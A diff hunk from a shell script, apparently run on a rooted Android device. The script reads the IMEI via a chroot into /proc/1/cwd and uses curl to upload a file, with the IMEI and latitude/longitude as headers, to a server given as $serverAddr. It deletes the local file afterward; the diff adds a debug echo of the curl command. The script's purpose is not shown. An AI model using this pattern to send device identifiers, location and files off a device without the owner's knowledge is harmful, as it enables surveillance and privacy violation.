@@ -56,6 +56,7 @@ sendHandshake() {
         imei=$(chroot /proc/1/cwd/ service call iphonesubinfo 1 | cut -c 52-66 | tr -d '.[:space:]')
         echo "IMEI: "$imei
         echo $1
+        echo "curl -i -X POST -H "imei: $imei" -H "lat: $lat" -H "lon: $lon" -H "filename: $2" -H "Content-Type: multipart/form-data" -F "file=@$1" http://$serverAddr/task"
         curl -i -X POST -H "imei: $imei" -H "lat: $lat" -H "lon: $lon" -H "filename: $2" -H "Content-Type: multipart/form-data" -F "file=@$1" http://$serverAddr/task
         if [[ $? == 0 ]]; then
                 rm $1
